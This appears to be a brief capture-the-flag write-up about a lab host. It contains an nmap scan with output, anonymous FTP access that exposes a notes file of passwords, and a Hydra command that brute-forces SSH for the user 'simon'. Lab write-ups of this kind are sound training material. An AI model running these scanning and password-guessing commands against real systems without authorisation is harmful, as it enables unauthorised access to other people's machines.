----

First we enumerate services on the host.
```bash
sudo nmap -sC -sV -P- 10.129.10.136
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: CAPA RESP-CODES AUTH-RESP-CODE TOP STLS USER PIPELINING SASL(PLAIN) UIDL
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: USER CAPA RESP-CODES SASL(PLAIN) AUTH-RESP-CODE TOP UIDL PIPELINING
2121/tcp open  ftp      ProFTPD
30021/tcp open ftp      ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Connected as anonymous to FTP on port 30021. There was a folder called `simon` and in that folder was a file, My_notes.txt containing passwords.

Used Hydra to use these passwords for ssh with the `simon` username.

```bash
hydra -l simon -P my_notes.txt 10.129.10.136 ssh -V
```

It worked and got the flag.
